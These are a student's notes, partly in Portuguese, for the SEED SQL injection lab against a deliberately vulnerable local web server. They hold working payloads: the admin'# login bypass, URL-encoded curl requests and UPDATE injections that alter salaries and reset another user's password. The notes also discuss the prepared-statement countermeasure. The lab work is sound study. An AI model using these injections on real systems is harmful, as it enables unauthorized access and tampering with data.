<!--
adicionar entry a /etc/hosts
10.9.0.5  www.seed-server.com

dcbuild
dcup

docksh my_sql_id_container

inside the my sql container
mysql -u root -pdees


mysql> use sqllab_users;    # change to the database
Database changed
mysql> show tables;
+------------------------+
| Tables_in_sqllab_users |
+------------------------+
- screenshot

select * from credential;

select * from credential where Name = 'Alice';
- screenshot


tentamos com 
admin'--
e variantes

conseguimos com
admin'#

' or 1=1 ORDER BY ID DESC #
Admin id is the biggest one

- screenshot


curl 'www.seed-server.com/unsafe_home.php?username=alice&Password=11'
- screenshot

curl 'www.seed-server.com/unsafe_home.php?username=admin\'#&Password=11'
modify with
%27 - '

curl 'www.seed-server.com/unsafe_home.php?username=admin%27#&Password=11'
- screenshot

Add to make # be %23 (ascii code)
curl 'www.seed-server.com/unsafe_home.php?username=admin%27%23&Password=11'
- screenshot



2 SQL Statements
SELECT ...; UPDATE
There is a countermeasure preventing you from running two SQL statements in this attack. Please use
the SEED book or resources from the Internet to figure out what this countermeasure is, and describe your
discovery in the lab report.

Countermeasure
- prepare statement does not allow executing two statements at the same time
- Does not allow multiple queries to run in the db (with only one prepare)


Alice', salary='999999999
- screenshot


', salary='1' WHERE Name = 'Boby'#

', salary=1 WHERE Name = 'Boby'#


change Boby password to 123
phone number comes after -> we can use this for the WHERE

Nickname:
Phone number: ' WHERE Name = 'Boby'#
Password: 123


Checking the code, we can see that it sets the session password
so when we get back to the home page there is an error because our password is incorrect
however looking at the db, we can see that the password hash was changed
- screenshot

and now we can login using the introduced credentials into boby's account
- screenshot

-->
